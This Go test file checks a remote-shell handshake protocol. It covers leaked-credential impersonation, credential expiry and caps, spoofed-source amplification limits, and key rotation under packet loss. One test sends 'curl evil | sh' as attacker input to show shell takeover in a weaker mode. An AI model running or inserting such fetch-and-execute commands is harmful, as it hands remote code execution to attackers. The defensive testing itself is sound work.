package hs

import (
	"bytes"
	"math/rand/v2"
	"net/netip"
	"testing"
	"time"
)

// Tests added in response to the adversarial review (FINDINGS "Review
// response").

// R1: in B3 a credential that leaks from SSH stdout (PSK, credential id,
// server KEM key) is NOT enough to impersonate the client, and a few msg1s
// forged with it do not lock the genuine client out.
func TestB3LeakedStdoutCannotImpersonate(t *testing.T) {
	cfg := DefaultConfig()
	genuine, _ := NewClientKEM()
	server, cred, err := NewBServer(B3BothKEM, serverHello, cfg, genuine.PublicKey)
	mustT(t, err)
	leaked := cred // everything printed on stdout

	// The attacker knows the client's public key too (it is not secret),
	// but not its private key.
	evil, _ := NewClientKEM()
	for i := 0; i < maxPendingPerCred+2; i++ {
		fake := &ClientKEM{sk: evil.sk, PublicKey: genuine.PublicKey}
		ac, am1, err := NewBClient(leaked, clientHello, cfg, fake)
		mustT(t, err)
		am2, asess, _, err := server.HandleInit(am1)
		if err != nil || asess == nil {
			t.Fatalf("server should answer a PSK-valid msg1 (unconfirmed): %v", err)
		}
		if _, _, err := ac.HandleResp(am2); err != ErrAuth {
			t.Fatalf("attacker without sk_C completed the handshake: %v", err)
		}
		// The server's 0.5-RTT data to this responder is unreadable by the
		// attacker (no keys), and nothing from the attacker can confirm it.
		if asess.confirmed {
			t.Fatal("unconfirmed responder marked confirmed")
		}
	}
	if server.consumed {
		t.Fatal("forged msg1s consumed the credential")
	}
	// The genuine client still gets in (oldest forged responder evicted).
	gc, gm1, err := NewBClient(cred, clientHello, cfg, genuine)
	mustT(t, err)
	gm2, gsess, _, err := server.HandleInit(gm1)
	mustT(t, err)
	cli, _, err := gc.HandleResp(gm2)
	mustT(t, err)
	cli.SetPeer(addrS)
	gsess.setUnvalidatedPeer(addrA)
	p, _ := cli.Seal([]byte("id\r"))
	if app, err := gsess.Open(p, addrA); err != nil || string(app) != "id\r" {
		t.Fatalf("genuine client: %q %v", app, err)
	}
	if !server.consumed {
		t.Fatal("confirmation did not consume the credential")
	}
	for _, pr := range server.pending {
		if pr.sess != gsess {
			t.Fatal("losing responders survived consumption")
		}
	}
	if !gsess.Validated() {
		t.Fatal("B3 confirmation from the msg1 address should validate it")
	}
	// msg1 forged after consumption: refused.
	fake := &ClientKEM{sk: evil.sk, PublicKey: genuine.PublicKey}
	_, am1, _ := NewBClient(leaked, clientHello, cfg, fake)
	if _, _, _, err := server.HandleInit(am1); err != ErrState {
		t.Fatalf("msg1 after consumption: %v", err)
	}
}

// R1 contrast: in B1 the same leak is impersonation (documented, not a bug).
func TestB1LeakedStdoutIsImpersonation(t *testing.T) {
	server, cred, _ := NewBServer(B1ServerKEM, serverHello, DefaultConfig())
	ac, am1, _ := NewBClient(cred, clientHello, DefaultConfig()) // attacker with stdout
	am2, srv, _, err := server.HandleInit(am1)
	mustT(t, err)
	cli, _, err := ac.HandleResp(am2)
	mustT(t, err)
	cli.SetPeer(addrS)
	srv.SetPeer(addrA)
	exchange(t, cli, srv, addrA, "curl evil | sh\r") // attacker drives the shell
	_, gm1, _ := NewBClient(cred, clientHello, DefaultConfig())
	if _, _, _, err := server.HandleInit(gm1); err != ErrState {
		t.Fatalf("genuine client should be locked out in B1: %v", err)
	}
}

// R2: TTL, cap and O(1) dispatch with several outstanding credentials.
func TestDispatcherTTLCapAndManyCredentials(t *testing.T) {
	clk := &fakeClock{t: time.Unix(1e9, 0)}
	cfg := cfgWith(clk)
	d := NewDispatcher(cfg)

	type cl struct {
		c    *BClient
		m1   []byte
		from netip.AddrPort
	}
	var cls []cl
	for i := 0; i < 40; i++ {
		ck, _ := NewClientKEM()
		cred, err := d.Mint("term"+string(rune('a'+i%20)), B3BothKEM, serverHello, ck.PublicKey, false)
		mustT(t, err)
		c, m1, _ := NewBClient(cred, clientHello, cfg, ck)
		cls = append(cls, cl{c, m1, netip.AddrPortFrom(addrA.Addr(), uint16(1000+i))})
	}
	if d.Outstanding() != 40 {
		t.Fatalf("outstanding %d", d.Outstanding())
	}
	// cap: a third credential for term "a" evicts its oldest unused one
	ck, _ := NewClientKEM()
	_, err := d.Mint("terma", B3BothKEM, serverHello, ck.PublicKey, false)
	mustT(t, err)
	if _, _, _, err := d.Handle(cls[0].m1, cls[0].from); err != ErrNoKey {
		t.Fatalf("evicted credential still accepted: %v", err)
	}
	// every other client completes, in shuffled order, through one socket
	rng := rand.New(rand.NewPCG(1, 2))
	order := rng.Perm(len(cls) - 1)
	sess := map[int]*Session{}
	for _, j := range order {
		k := cls[j+1]
		out, _, _, err := d.Handle(k.m1, k.from)
		mustT(t, err)
		s, _, err := k.c.HandleResp(out[0])
		mustT(t, err)
		s.SetPeer(addrS)
		sess[j+1] = s
	}
	for j, s := range sess {
		msg := []byte{byte(j)}
		p, _ := s.Seal(msg)
		_, app, _, err := d.Handle(p, cls[j].from)
		if err != nil || !bytes.Equal(app, msg) {
			t.Fatalf("client %d: %v %v", j, app, err)
		}
	}
	if d.Outstanding() != 1 { // only the one minted for the cap test
		t.Fatalf("outstanding after use %d", d.Outstanding())
	}
	// TTL: the remaining unused credential dies after CredentialTTL
	clk.add(CredentialTTL + time.Second)
	if n := d.Reap(); n == 0 || d.Outstanding() != 0 {
		t.Fatalf("reap: %d, outstanding %d", n, d.Outstanding())
	}
	// direct API: an expired BServer refuses msg1
	srv, cred, _ := NewBServer(B1ServerKEM, serverHello, cfg)
	_, m1, _ := NewBClient(cred, clientHello, cfg)
	clk.add(CredentialTTL + time.Second)
	if _, _, _, err := srv.HandleInit(m1); err != ErrState {
		t.Fatalf("expired credential accepted: %v", err)
	}
}

// R7: a spoofed-source race can point the server at a victim, but the
// server then sends at most antiAmplification x the attacker's bytes
// there, and the next genuine packet restores the validated address. A
// genuine roam is validated by an encrypted path challenge.
func TestAntiAmplificationAndPathValidation(t *testing.T) {
	clk := &fakeClock{t: time.Unix(1e9, 0)}
	cfg := cfgWith(clk)
	d := NewDispatcher(cfg)
	cli, srv := attachViaDispatcher(t, d, cfg, false, addrA)
	if !srv.Validated() || srv.Peer != addrA {
		t.Fatal("B3 handshake address not validated")
	}
	victim := netip.MustParseAddrPort("192.0.2.200:9")
	p, _ := cli.Seal([]byte("keystroke"))
	// attacker copies the packet and wins the race from a spoofed source
	if _, _, _, err := d.Handle(p, victim); err != nil {
		t.Fatal(err)
	}
	if srv.Peer != victim || srv.Validated() {
		t.Fatal("expected unvalidated move to the spoofed address")
	}
	sent := 0
	for i := 0; i < 1000; i++ {
		if srv.AllowSend(20) {
			sent += 20
		}
	}
	if sent > antiAmplification*len(p) {
		t.Fatalf("sent %d bytes to an unvalidated address after receiving %d", sent, len(p))
	}
	t.Logf("reflection bounded: %d bytes to victim for %d bytes spoofed (%.1fx)", sent, len(p), float64(sent)/float64(len(p)))
	// the genuine copy arrives late: replay, ignored
	if _, _, _, err := d.Handle(p, addrA); err != ErrReplay {
		t.Fatalf("late genuine copy: %v", err)
	}
	// next genuine packet: back to the validated address
	p2, _ := cli.Seal([]byte("next"))
	_, _, _, err := d.Handle(p2, addrA)
	mustT(t, err)
	if srv.Peer != addrA || !srv.Validated() {
		t.Fatal("did not return to the validated address")
	}
	// genuine roam to addrB: challenge -> response -> validated
	p3, _ := cli.Seal([]byte("from new wifi"))
	out, _, _, err := d.Handle(p3, addrB)
	mustT(t, err)
	if srv.Validated() || len(out) != 1 {
		t.Fatalf("roam should send exactly one challenge, got %d", len(out))
	}
	if _, err := cli.Open(out[0], addrS); err != nil {
		t.Fatal(err)
	}
	resp := cli.Outbox()
	_, _, _, err = d.Handle(resp[0], addrB)
	mustT(t, err)
	if !srv.Validated() || srv.Peer != addrB {
		t.Fatal("path response did not validate the new address")
	}
}

// R5: an initiator that goes idle after rotating keeps retransmitting the
// confirming keepalive, so the responder eventually promotes even if the
// first keepalive is lost and the initiator's old keys have expired.
func TestRekeyIdleInitiatorKeepalive(t *testing.T) {
	clk := &fakeClock{t: time.Unix(1e9, 0)}
	cfg := cfgWith(clk)
	cli, srv, _, _ := handshakeB(t, B3BothKEM, cfg)
	cli.StartRekey()
	_, err := srv.Open(cli.Outbox()[0], addrA)
	mustT(t, err)
	_, err = cli.Open(srv.Outbox()[0], addrS)
	mustT(t, err)
	lost := cli.Outbox() // the keepalive: lost
	if len(lost) != 1 {
		t.Fatalf("expected one keepalive, got %d", len(lost))
	}
	// initiator idle for longer than KeepPrevFor
	for i := 0; i < 12; i++ {
		clk.add(time.Second)
		cli.Tick()
		srv.Tick()
		if i < 11 {
			cli.Outbox() // keep losing them
		}
	}
	if cli.prev != nil {
		t.Fatal("initiator should have dropped its previous keys by now")
	}
	// responder still on old keys: its packet is lost (ErrNoKey) ...
	p, _ := srv.Seal([]byte("output"))
	if _, err := cli.Open(p, addrS); err != ErrNoKey {
		t.Fatalf("expected ErrNoKey for old-epoch packet, got %v", err)
	}
	// ... but the retransmitted keepalive gets through and heals it
	ka := cli.Outbox()
	if len(ka) == 0 {
		t.Fatal("initiator stopped retransmitting the keepalive")
	}
	_, err = srv.Open(ka[len(ka)-1], addrA)
	mustT(t, err)
	exchange(t, srv, cli, addrS, "output again")
	if cli.awaitConfirm {
		t.Fatal("initiator still waiting for confirmation")
	}
}

// R5: property test over random interleavings of rekey INIT/RESP,
// keepalives, app data, loss, duplication, reordering, crossing rekeys and
// timer expiry. Invariants:
//   - no genuine packet ever fails authentication (ErrAuth would mean the
//     two sides derived different keys for the same index: root drift);
//   - after the network heals, both sides converge: no rekey in flight,
//     equal roots, and app data flows both ways.
func TestRekeyInterleavingsProperty(t *testing.T) {
	seeds := 2000
	if testing.Short() {
		seeds = 200
	}
	var totalRekeys uint64
	for seed := 0; seed < seeds; seed++ {
		rng := rand.New(rand.NewPCG(uint64(seed), 7))
		clk := &fakeClock{t: time.Unix(1e9, 0)}
		cfg := cfgWith(clk)
		cfg.RekeyAfterTime = 5 * time.Second
		cfg.KeepPrevFor = 4 * time.Second
		cli, srv, _, _ := handshakeB(t, B1ServerKEM, cfg)
		type pkt struct {
			to   *Session
			from netip.AddrPort
			b    []byte
		}
		var q []pkt
		loss := rng.Float64() * 0.4
		push := func(from *Session, b []byte, lossy bool) {
			if lossy && rng.Float64() < loss {
				return
			}
			p := pkt{srv, addrA, b}
			if from == srv {
				p = pkt{cli, addrS, b}
			}
			q = append(q, p)
			if lossy && rng.IntN(20) == 0 {
				q = append(q, p) // duplicate
			}
		}
		drain := func(lossy bool) {
			for _, b := range cli.Outbox() {
				push(cli, b, lossy)
			}
			for _, b := range srv.Outbox() {
				push(srv, b, lossy)
			}
		}
		deliver := func(i int) {
			p := q[i]
			q = append(q[:i], q[i+1:]...)
			if _, err := p.to.Open(p.b, p.from); err == ErrAuth || err == ErrMalformed {
				t.Fatalf("seed %d: genuine packet rejected with %v (key disagreement)", seed, err)
			}
		}
		for step := 0; step < 300; step++ {
			switch r := rng.IntN(12); {
			case r == 0:
				cli.StartRekey()
			case r == 1:
				srv.StartRekey()
			case r < 4:
				if b, err := cli.Seal([]byte("c")); err == nil {
					push(cli, b, true)
				}
			case r < 6:
				if b, err := srv.Seal([]byte("s")); err == nil {
					push(srv, b, true)
				}
			case r == 6:
				clk.add(time.Duration(rng.IntN(3000)) * time.Millisecond)
				cli.Tick()
				srv.Tick()
			default:
				if len(q) > 0 {
					deliver(rng.IntN(len(q))) // reorder
				}
			}
			drain(true)
		}
		// heal: no loss, FIFO, timers running, no new time-based rekeys
		cli.cfg.RekeyAfterTime, srv.cfg.RekeyAfterTime = time.Hour, time.Hour
		for i := 0; i < 80; i++ {
			for len(q) > 0 {
				deliver(0)
				drain(false)
			}
			clk.add(500 * time.Millisecond)
			cli.Tick()
			srv.Tick()
			drain(false)
		}
		for len(q) > 0 {
			deliver(0)
			drain(false)
		}
		if cli.pend != nil || srv.pend != nil || cli.next != nil || srv.next != nil || cli.awaitConfirm || srv.awaitConfirm {
			t.Fatalf("seed %d: rekey still in flight after heal: cli pend=%v next=%v await=%v cur=%v; srv pend=%v next=%v await=%v cur=%v", seed, cli.pend != nil, cli.next != nil, cli.awaitConfirm, cli.cur != nil, srv.pend != nil, srv.next != nil, srv.awaitConfirm, srv.cur != nil)
		}
		if cli.rootForTest() != srv.rootForTest() {
			t.Fatalf("seed %d: roots diverged", seed)
		}
		for _, dir := range [][2]*Session{{cli, srv}, {srv, cli}} {
			b, err := dir[0].Seal([]byte("final"))
			mustT(t, err)
			from := addrA
			if dir[0] == srv {
				from = addrS
			}
			if app, err := dir[1].Open(b, from); err != nil || string(app) != "final" {
				t.Fatalf("seed %d: no liveness after heal: %v", seed, err)
			}
		}
		totalRekeys += cli.Stats.Rekeys
	}
	t.Logf("%d seeds, %d completed rekeys in total", seeds, totalRekeys)
}
